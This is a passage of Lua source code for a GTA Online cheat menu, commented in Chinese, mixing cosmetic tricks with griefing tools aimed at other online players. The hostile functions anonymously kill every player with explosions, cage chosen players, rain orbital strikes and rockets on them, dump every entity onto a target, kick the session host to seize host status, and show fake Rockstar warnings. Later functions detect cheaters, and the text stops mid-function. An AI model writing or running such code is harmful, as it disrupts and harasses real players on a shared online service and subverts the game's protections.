    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_gang_call")) > 0 then
        local sender = memory.read_int(memory.script_local("am_gang_call", 286))
        local target = memory.read_int(memory.script_local("am_gang_call", 287)) --返回目标玩家PID

        --[[ local netId = memory.read_int(memory.script_local("am_gang_call", 62 + 10 + 1))
        util.toast(netId)
        if NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(netId) and target == PLAYER.PLAYER_ID() then
            local mugger = NETWORK.NET_TO_PED(netId)
            delete_entity(mugger)
            util.toast("劫匪来自: " .. PLAYER.GET_PLAYER_NAME(sender))
        end ]]

        if target == PLAYER.PLAYER_ID() then
            MISC.TERMINATE_ALL_SCRIPTS_WITH_THIS_NAME("am_gang_call")
            util.toast("已阻止劫匪事件")
        end

    end
end
-----劫匪检测
function show_mugger()
	if NETWORK.NETWORK_IS_SESSION_ACTIVE() and SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_gang_call")) > 0 then
        local netId	= memory.read_int(memory.script_local("am_gang_call", 62 + 10 + 1))
        if NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(netId) and not ENTITY.IS_ENTITY_DEAD(NETWORK.NET_TO_PED(netId), false) then
            local mugger = NETWORK.NET_TO_PED(netId)
            draw_bounding_box(mugger, true, {r = 255, g = 0, b = 0, a = 80})
        end
	end
end




-----一拳超人
function supermanpersonl()
	local pWeapon = memory.alloc_int()
	WEAPON.GET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), pWeapon, 1)
	local weaponHash = memory.read_int(pWeapon)
	if WEAPON.IS_PED_ARMED(PLAYER.PLAYER_PED_ID(), 1) or weaponHash == util.joaat("weapon_unarmed") then
		local pImpactCoords = v3.new()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
		if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pImpactCoords) then
			set_explosion_proof(PLAYER.PLAYER_PED_ID(), true)
			util.yield_once()
			FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z - 1.0, 29, 5.0, false, true, 0.3, true)
		elseif not FIRE.IS_EXPLOSION_IN_SPHERE(29, pos.x, pos.y, pos.z, 2.0) then
			set_explosion_proof(PLAYER.PLAYER_PED_ID(), false)
		end
	end
end


----小狗枪
function poodle_gun(toggle)
    doggun_toggled = toggle
    if doggun_toggled then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(), false)--禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), -1768145561, 1, true, true)
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not doggun_toggled, false, false, false)

        local hash = 1125994524
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        dog_gun = create_ped(0, hash, pos.x, pos.y, pos.z, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dog_gun, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 18905), 0.03, -0.01, 0.15, -50, 0, 320, false, false, false, true, 0, true, 0)

        while doggun_toggled do
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(dog_gun)
            util.yield()
        end

    else
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not doggun_toggled, false, false, false)
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(), true)
        delete_entity(dog_gun)
    end
end


-------核弹枪
mutually_exclusive_weapons  = {}
function toDirection(rotation) 
	local adjusted_rotation = { 
		x = (math.pi / 180) * rotation.x, 
		y = (math.pi / 180) * rotation.y, 
		z = (math.pi / 180) * rotation.z 
	}
	local direction = {
		x = - math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		y =   math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		z =   math.sin(adjusted_rotation.x)
	}
	return direction
end
function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2
    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_camera(1000)
    end
    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end
function nukegunmode()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(-1312131151, false)
        util.create_thread(function()
            local hash = util.joaat('w_arena_airmissile_01a')
            request_model(hash)
            local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
            local dir, pos = direction()
            local bomb = entities.create_object(hash, pos)
            ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
            ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
            while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                util.yield()
            end
            local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
            delete_entity(bomb)
            executeNuke(nukePos)
        end)
    end
end


------杀死敌人
function get_peds_in_player_range(player, radius)
	local peds = {}
	local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
	local pos = players.get_position(player)
	for _, ped in ipairs(entities.get_all_peds_as_handles()) do
		if ped ~= playerPed and not PED.IS_PED_FATALLY_INJURED(ped) then
			local pedPos = ENTITY.GET_ENTITY_COORDS(ped, true)
			if pos:distance(pedPos) <= radius then table.insert(peds, ped) end
		end
	end
	return peds
end


----投掷物发射器
local launcherThrowable = util.joaat('weapon_grenade')
function bulletset(value)
    launcherThrowable = throwablesTable.hash[value]
end
function throwablebullet()
    if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == -1568386805 and PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        --移除本身弹药
        WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(-1568386805, false)
    
        local currentWeapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), false)
        local pos1 = ENTITY.GET_ENTITY_BONE_POSTION(currentWeapon, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(currentWeapon, 'gun_muzzle'))
        local pos2 = get_offset_from_camera(30)
        if not WEAPON.HAS_PED_GOT_WEAPON(PLAYER.PLAYER_PED_ID(), launcherThrowable, false) then
            WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), launcherThrowable, 9999, false, false)
        end
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, 200, true, launcherThrowable, PLAYER.PLAYER_PED_ID(), true, false, 2000.0)
    end
end


----举手
function raise_hand()
    if PAD.IS_CONTROL_PRESSED(1, 323) then
        request_anim_dict("random@mugging3")
        if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
            WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), MISC.GET_HASH_KEY("WEAPON_UNARMED"), true)
            TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3, 3, -1, 51, 0, false, false, false)
            STREAMING.REMOVE_ANIM_DICT("random@mugging3")
            PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
        end
    else
        if ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
            TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
            PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
        end
    end
end

----太空步
function Space_walk()
    if PAD.IS_CONTROL_PRESSED(0, 32)  or PAD.IS_CONTROL_PRESSED(0, 34) or PAD.IS_CONTROL_PRESSED(0, 35) then
        local f = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
        f['x'] = -f['x']
        f['y'] = -f['y']
        f['z'] = -f['z']
        ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), f['x'], f['y']*3, 0.0)
    end
end
----表演
function Performing_actions(index)
    local animDictionary = {"anim@arena@celeb@flat@solo@no_props@","anim@arena@celeb@flat@solo@no_props@","anim@mp_player_intcelebrationfemale@karate_chops"}
    local animationName = {"cap_a_player_a","flip_a_player_a","karate_chops"}
    request_anim_dict(animDictionary[index])
    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), animDictionary[index], animationName[index], 8.0, 8.0, 5000, 1, 0, true, true, true)
end
----忍者跑
function renzhepao(on)
    if on then
        local renzhe = "missfbi1"
        local pao = "ledge_loop"
        request_anim_dict(renzhe)
        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), renzhe, pao, 3, 3, -1, 51, 0, false, false, false)
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
    end
end
----前空翻
function forward_somersault()
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), 0, 0, hdg, 1, true)
    for i = 0, -360, -8 do
        ENTITY.SET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), i, 0, hdg, 1, true)
        util.yield()
    end
end


--------匿名杀死所有人
function kill_player(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 100, true, false, 1, false)
end
function nimingsharen()
    for k,v in pairs(players.list(false, true, true)) do
        kill_player(v)
    end
end


--普通笼子
function ptlz(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local hash = util.joaat("prop_gold_cont_01")
    request_model(hash)
	pos.z = pos.z-0.9
	local object1 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, true)																	
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
end
--七度空间
function qdkj(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = 1089807209
    request_model(hash)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--钱笼子
function zdlz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
    request_model(hash)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object, 0)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z, 1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--垃圾箱
function yylz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = 684586828
	request_model(hash)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object1 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object, 0)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z, 1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--小车车
function cclz(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local hash = 4022605402
    request_model(hash)
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
    util.yield(15)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐
function sdkl1(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = 238789712
    request_model(hash)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐pro
function sdkl2(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = util.joaat("ch_prop_tree_02a")
    request_model(hash)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐promax
function sdkl3(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
	local hash = util.joaat("ch_prop_tree_03a")
    request_model(hash)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	util.yield()
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object, 0)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z, 1, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--电击笼
function powercage(pid)
    local number_of_cages = 6
    local elec_box = util.joaat("prop_elecbox_12")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    pos.z = pos.z - 0.5
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(2.5)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 1, true)
            obj_pos.z = obj_pos.z + 0.75
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end
--竞技管
function jjglz(pid)
   local hash = util.joaat("stt_prop_stunt_tube_s")
	request_model(hash)
	local pos = players.get_position(pid)
	local obj = entities.create_object(hash, pos)
	local rot = ENTITY.GET_ENTITY_ROTATION(obj, 2)
	ENTITY.SET_ENTITY_ROTATION(obj, rot.x, 90.0, rot.z, 1, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
end

--英国女王笼子
function gueencage(pid)
    local number_of_cages = 6
    local coffin_hash = util.joaat("prop_coffin_02b")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(coffin_hash)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(0.8)
        obj_pos:add(pos)
        obj_pos.z = obj_pos.z + 0.1
       local coffin = entities.create_object(coffin_hash, obj_pos)
       ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle, 1, true)
       ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
    end
end
--运输集装箱
function chestcage(pid)
    local container_hash = util.joaat("prop_container_ld_pu")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    pos.z = pos.z - 1
    local container = entities.create_object(container_hash, pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--载具笼子
function vehcagelol(pid)
    local container_hash = util.joaat("boxville3")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
    ENTITY.SET_ENTITY_VISIBLE(container, false)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--燃气笼
function gascage(pid)
    local gas_cage_hash = util.joaat("prop_gascage01")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(gas_cage_hash)
    pos.z = pos.z - 1
    local gas_cage = entities.create_object(gas_cage_hash, pos, 0)
    pos.z = pos.z + 1
    local gas_cage2 = entities.create_object(gas_cage_hash, pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage, true)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage2, true)
end

---------发送垃圾
function tpTableToPlayer(tbl, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        for _, v in pairs(tbl) do
            if (not PED.IS_PED_A_PLAYER(v)) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
            end
        end
    end
end
function TpAllPeds(player)
    local pedHandles = entities.get_all_peds_as_handles()
    tpTableToPlayer(pedHandles, player)
end
function TpAllVehs(player)
    local vehHandles = entities.get_all_vehicles_as_handles()
    tpTableToPlayer(vehHandles, player)
end
function TpAllObjects(player)
    local objHandles = entities.get_all_objects_as_handles()
    tpTableToPlayer(objHandles, player)
end
function TpAllPickups(player)
    local pickupHandles = entities.get_all_pickups_as_handles()
    tpTableToPlayer(pickupHandles, player)
end

---------给予爆炸子弹
function GetTableFromV3Instance(v3int)
    local tbl = {x = v3.getX(v3int), y = v3.getY(v3int), z = v3.getZ(v3int)}
    return tbl
end
function SE_add_owned_explosion(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
    FIRE.ADD_OWNED_EXPLOSION(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
end


----野兽模式
function beast_mode()
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.05, 0.5, -1.11)
    local scene = NETWORK.NETWORK_CREATE_SYNCHRONISED_SCENE(pos.x, pos.y, pos.z, 0.0, 0.0, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()) + 90.0, 2, false, false, 1.0, 0.0, 1.0)
    request_anim_dict('ANIM@MP_FM_EVENT@INTRO')
    NETWORK.NETWORK_ADD_SYNCHRONISED_SCENE_CAMERA(scene, 'ANIM@MP_FM_EVENT@INTRO', 'BEAST_TRANSFORM_CAM')

    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), 'ANIM@MP_FM_EVENT@INTRO', 'BEAST_TRANSFORM', 1000.0, -2.0, -1, 0, 0.0, false, false, false)
    PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(PLAYER.PLAYER_PED_ID(), false, false)
    NETWORK.NETWORK_FORCE_LOCAL_USE_OF_SYNCED_SCENE_CAMERA(scene)
    NETWORK.NETWORK_START_SYNCHRONISED_SCENE(scene)

    if not GRAPHICS.ANIMPOSTFX_IS_RUNNING('BeastIntroScene') then
        GRAPHICS.ANIMPOSTFX_PLAY('BeastIntroScene', 0, false)
    end
    AUDIO.START_AUDIO_SCENE('FM_Event_Beast_Transform_Sequence_Scene')
    AUDIO.PLAY_SOUND_FRONTEND(-1, 'Frontend_Beast_Transform_Back', 'FM_Events_Sasquatch_Sounds', false)
end

----原子弹轰炸
function orbital(pid) 
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end

----火箭雨v1
function rain_rockets(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local hash = util.joaat("weapon_airstrike_rocket")
    request_weapon_asset(hash)
    pos.x = pos.x + math.random(-10,10)
    pos.y = pos.y + math.random(-10,10)
    local ground_ptr = memory.alloc(32)
    MISC.GET_GROUND_Z_FOR_3D_COORD(pos.x, pos.y, pos.z, ground_ptr, false, false)
    pos.z = memory.read_float(ground_ptr)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+50, pos.x, pos.y, pos.z, 200, true, hash, PLAYER.PLAYER_PED_ID(), true, false, 2500.0)
    util.yield(200)
end
----子弹雨
function rain_bullet(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = MISC.GET_HASH_KEY("weapon_machinepistol")
    request_weapon_asset(hash)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    pos.z = pos.z + 10.0
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z-10, 10000.00, true, hash, PLAYER.PLAYER_PED_ID(), true, false, 10000.0)
    pos.y = pos.y + 10.0
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y-10, pos.z-10, 10000.00, true, hash, PLAYER.PLAYER_PED_ID(), true, false, 10000.0)
    pos.x = pos.x + 10.0
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x-10, pos.y-10, pos.z-10, 10000.00, true, hash, PLAYER.PLAYER_PED_ID(), true, false, 10000.0)
end


--------------自定义假R*警告
function custom_alert(strings)
    while true do
        HUD.SET_WARNING_MESSAGE_WITH_HEADER_AND_SUBSTRING_FLAGS("ALERT", "JL_INVITE_ND", 2, "", true, -1, -1, strings, "", true, 0)
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then --enter or space
            break
        end
        util.yield()
    end
end

----自动加入游戏
function autoaccept()
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    local paused = HUD.IS_PAUSE_MENU_ACTIVE()
    for _, hash in ipairs(invite_string) do
        if message_hash == MISC.GET_HASH_KEY(hash) and not paused then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
            util.yield(25)
        end
    end
end
----自动获取主机
function autogethost()
    if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then
        if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then
            menu.trigger_commands("kick "..PLAYER.GET_PLAYER_NAME(players.get_host()))
            util.yield(200)
        end
    end
    if players.get_name(PLAYER.PLAYER_ID()) == players.get_name(players.get_host()) then
        util.toast("获得主机,已禁用自动获取主机")
        menu.set_value(auto_host, false)
    end
end

----强制成为脚本主机
function force_script_host(scriptname)
    request_script(scriptname)
    util.request_script_host(scriptname)
	NETWORK.NETWORK_REQUEST_TO_BE_HOST_OF_THIS_SCRIPT()
end


----作弊者检测
local modder_list = {}
--玩家语音检测
function talking_detection()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        for _, pid in players.list(false, true, true) do
            if NETWORK.NETWORK_IS_PLAYER_TALKING(pid) then
                util.toast(PLAYER.GET_PLAYER_NAME(pid).." 在说话")
            end
        end 
    end
end
--玩家无敌检测
function god_detection()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        for _, pid in players.list(false, true, true) do
            if not table_find(modder_list, pid) and players.is_godmode(pid) and not players.is_in_interior(pid) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(PLAYER.GET_PLAYER_PED(pid)) then
                modder_list[#modder_list] = pid
                util.toast(players.get_name(pid) .. " 是无敌模式")
                break
            end
        end
    end
end
--载具无敌检测
function car_god_detection()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        for _, pid in ipairs(players.list(false, true, true)) do
            local player_veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.GET_PLAYER_PED(pid))
            if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid), false) then
                if not table_find(modder_list, pid) and not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(player_veh) then
                    modder_list[#modder_list] = pid
                    util.toast(players.get_name(pid) .. "载具处于无敌模式")
                    break
                end
            end
        end  
    end
end
--室内使用武器检测
function usingweapon_detection()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        for _, pid in ipairs(players.list(false, true, true)) do
            if not table_find(modder_list, pid) and players.is_in_interior(pid) and WEAPON.IS_PED_ARMED(PLAYER.GET_PLAYER_PED(pid), 7) then
                modder_list[#modder_list] = pid
                util.toast(players.get_name(pid) .. " 正在室内使用武器,极大可能是作弊者")
                break
            end
        end
    end
end
--观看检测
function lookingyou_detection()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        for _, pid in ipairs(players.list(false, true, true)) do
            local cam_dist = v3.distance(players.get_position(PLAYER.PLAYER_ID()), players.get_cam_pos(pid))
            local ped_dist = v3.distance(players.get_position(PLAYER.PLAYER_ID()), players.get_position(pid))
            if not table_find(modder_list, pid) and cam_dist < 20.0 and not PED.IS_PED_DEAD_OR_DYING(PLAYER.GET_PLAYER_PED(pid)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) then
                modder_list[#modder_list] = pid
                util.yield(500)
                if ped_dist > 35.0 then
                    util.toast(players.get_name(pid) .. " 正在观看你")
                end
            end
        end
    end
end
--传送检测
function tp_detection()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped =  PLAYER.GET_PLAYER_PED(pid)
            if not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                local oldpos = players.get_position(pid)
                util.yield(500)
